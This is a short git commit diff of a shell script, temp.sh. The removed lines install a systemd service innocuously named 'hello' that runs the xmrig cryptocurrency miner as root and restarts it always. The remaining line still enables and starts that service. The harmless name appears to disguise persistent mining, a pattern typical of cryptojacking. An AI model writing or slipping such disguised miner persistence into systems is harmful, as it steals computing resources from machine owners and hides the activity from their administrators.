6a34dc29a3fa5d6460cd3067d5bdf60352a82c82
kalinh <taikhoanxzc004@gmail.com>
2023-11-29 16:04:55 +0700

    Update temp.sh

--- temp.sh
+++ temp.sh
@@ -1,15 +1,1 @@
-sudo bash -c 'cat > /lib/systemd/system/hello.service <<EOL
-[Unit]
-Description=hello
-After=network.target
-[Service]
-ExecStart=/usr/local/src/xmrig/build/xmrig
-WatchdogSec=1800
-Restart=always
-RestartSec=60
-User=root
-[Install]
-WantedBy=multi-user.target
-EOL'
-
-sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
+systemctl daemon-reload && systemctl enable hello.service && systemctl start hello.service
